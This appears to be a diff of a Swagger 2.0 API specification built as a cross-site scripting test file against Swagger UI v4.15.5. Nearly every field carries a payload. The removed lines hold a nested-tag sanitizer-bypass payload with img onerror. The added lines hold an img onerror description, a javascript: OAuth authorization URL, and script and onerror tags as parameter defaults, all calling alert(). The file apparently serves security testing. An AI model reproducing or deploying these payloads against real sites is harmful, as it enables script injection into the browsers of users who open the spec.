@@ -1,38 +1,47 @@
 swagger: '2.0'
 info:
-  title: XSS Attack BY Drocapy"><h1>hello</h1>
-  description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>"><img onerror=alert(document.domain) src=1>"></form>
-  version: production
-basePath: /JSSResource/
-produces:
-  - application/xml
-  - application/json
-consumes:
-  - application/xml
-  - application/json
-security:
-  - basicAuth: []
+  version: "1.0.0"
+  title: "DOM XSS Testing Environment By Drocapy"
+  description: "Target Audit - Swagger UI v4.15.5 <img src=x onerror=alert('Description_XSS')>"
+
+host: "143.166.199.59"
+basePath: "/api/v1"
+
+securityDefinitions:
+  OauthXSS:
+    type: oauth2
+    authorizationUrl: "javascript:alert('Authorize_Button_XSS')//"
+    flow: implicit
+    scopes:
+      read: "Read Access"
+
 paths:
-  /Drocapy:
-    get:
-      responses:
-        '200':
-          description: No response was specified
-      tags:
-        - Drocapy
-      operationId: findAccounts
-      summary: Finds all accounts
-  '/hack/hachid/{id}':
-    delete:
+  /avscanner/fileUploads:
+    post:
+      summary: "Upload test for parameters bypass"
+      description: "Click Try it out to test array parameter rendering"
+      operationId: "fileUploads"
+      consumes:
+        - "multipart/form-data"
       parameters:
-        - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>"><img onerror=alert(document.domain) src=1>"></form>
-          format: int64
-          in: path
-          name: id
+        - name: "id"
+          in: "path"
           required: true
-          type: integer
+          type: "array"
+          items:
+            type: "string"
+          collectionFormat: "multi"
+          default: 
+            - "<script>alert('Array_Default_XSS_1')</script>"
+            - "<img src=x onerror=alert('Array_Default_XSS_2')>"
+        - name: "Context"
+          in: "formData"
+          required: true
+          type: "string"
+          default: "{\"SourceApplicationName\": \"Test\"}"
       responses:
         '200':
-          description: No response was specified
+          description: "Success"
+
+security:
+  - OauthXSS: []
